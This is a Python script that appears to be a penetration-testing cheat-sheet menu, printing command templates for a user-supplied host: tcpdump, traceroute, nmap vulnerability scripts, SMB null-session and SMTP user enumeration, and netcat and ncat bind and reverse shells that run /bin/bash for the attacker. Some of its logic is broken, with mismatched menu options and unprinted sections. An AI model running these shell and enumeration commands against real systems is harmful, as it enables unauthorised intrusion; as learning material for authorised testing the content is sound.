
def scan():
    #

    import socket

    G = '\x1b[1;32m'
    R = '\x1b[31m'

    host=input (G+"put your host  :") or "127.0.0.1"
    ip   = socket.gethostbyname(host)

    TCPDUMP='''


    tcpdump -nn -X -v -i wlan0 -s0
    tcpdump -nn {tcp|udp|icmp|arp|ip} {and|or|not} {port} {and|or|not} {dst|src|host} 8.8.8.8
    tcpdump -nn tcp and port 21 and host {0} -i wlan0 -s0 -w ftp.pcapng
    tcpdump -nn -r ftp.pcapng '''



    Wireshark='''
    ip.addr == {0}
    ip.addr == {0} and http
    http or arp
    ip.addr == {0}and tcp.port == 80 '''


    traceroute='''
    Linux traceroute use UDP by default
    traceroute -n {0} *UDP
    traceroute -I {0} *ICMP
    traceroute -T {0} *TCP
    Windows tracert use ICMP by default
    tracert -d {0} #ICMP '''.format(host)

    nmap="""
    to see live hosts ping_sweap
    ------------
    nmap -n -sn {0}
    -----
    nmap -n -Pn -sS {0}
    -----
    nmap --top-ports 100 100 {0} 

    nmap -oA filename # to write output in text

    Special options
    ------------------
    nmap --reason {0}
    nmap --badsum {0} #some times it bypass the firewall 

    OS Fingerprinting
    ----------------
    nmap -O {0}
    Version Scanning
    -----------------
    nmap -sV {0}
    nmap -A {0}  #A = -sV -O -sC
    --------------------------
    NMAP Script Engine
    ------------------------------
    ls /usr/share/nmap/scripts/
    *-----------*
    nmap -p 139,445 --script=smb* {0} # star to eun all scripts with name smb
    --------------------------------------
    nmap -sC {0}
    nmap --script=http-robots.txt.nse -p80 {0}
    nmap -p 80 --script=http-vuln-cve2010-2861.nse {0}
    nmap -p 21 --script=ftp-anon.nse {0}
    nmap -p 139,445 --script=smb-security-mode.nse {0}
    nmap --script=smb-os-discovery.nse {0}
    nmap --script=dns-zone-transfer -p 53 {1}""".format(host,ip)


    SMB='''
    port 139 |445 you can enumerat users

    NULL Session
    -------------
    rpcclient -U "" -N {0}   
    #-U for empty usersr
    search for user 
    enumdomusers
    ----------
    queryuser xxxx
    ------------
    Session with username and password

    rpcclient -U "test" {0} '''.format(host)

    Enum4Linux='''
    enum4linux {0}
    enum4linux -u "test" -p "test" {0} '''.format(host)

    SMTP='''
    telnet {0} 25
    VRFY msfadmin
    smtp-user-enum -M VRFY -U users.txt -t {0}
    '''.format(host)

    netcat=''''
    Find open ports
    nc -nv {0} 21
    nc -vz {0} 21
    nc -v {0} 21
    timeout 1 nc -v {0} 21

    Chat using nc
    -------------------
    nc -nlvp 4444 #on server
    nc -nv {0} 4444 #on client

    Bind shell
    -------
    nc -nlvp 4444 -e /bin/bash (cmd.exe) #on target
    nc -nv {0} 4444 #on attacker

    Reverse shell
    ----------------
    nc -nlvp 4444 #on attacker
    nc -nv {0} 4444 -e /bin/bash (cmd.exe) #on target3

    ncat --exec /bin/bash (cmd.exe) --allow {0} -vnl 4444 --ssl
    ncat -v {0} 4444 --ssl


    nc -nlvp 4444 > wget (wget.exe) #Victim Machine
    nc -nv 127.0.0.1 4444 < /usr/bin/wget (/usr/share/windows_binaries/wget.exe) #Kali Machine

    '''.format(host)




    Nessus='''
    https://www.tenable.com/downloads/nessus
    dpkg -i Nessus-6.9.4-debian6_amd64.deb

    service nessusd start
    -----------------------
    update-rc.d nessusd enable
    ----------
    https://localhost:8834/ '''


    if 1 :
        options=['1-TCPDUMP','2-Wireshark','3-traceroute','4-nmap',"4-SMB",'5-Enum4Linux','6-SMTP',"7-netcat","8-Nessus","*"]
        for i in options:    print(i)

        opt=input ("put your option pls :")
        if opt=="1":
            print(TCPDUMP)
        elif opt=="2":
                print(Wireshark)
        elif opt=="3":
            print(traceroute)
        elif opt=="4":
                print(SMB)
        elif opt=="5":
                print(Enum4Linux)
        elif opt=="6":
                print(SMTP)
        elif opt=="7":
            exit("netcat")
        elif opt=="8":
                print("Nessus")
        elif opt=="*":
            exit()


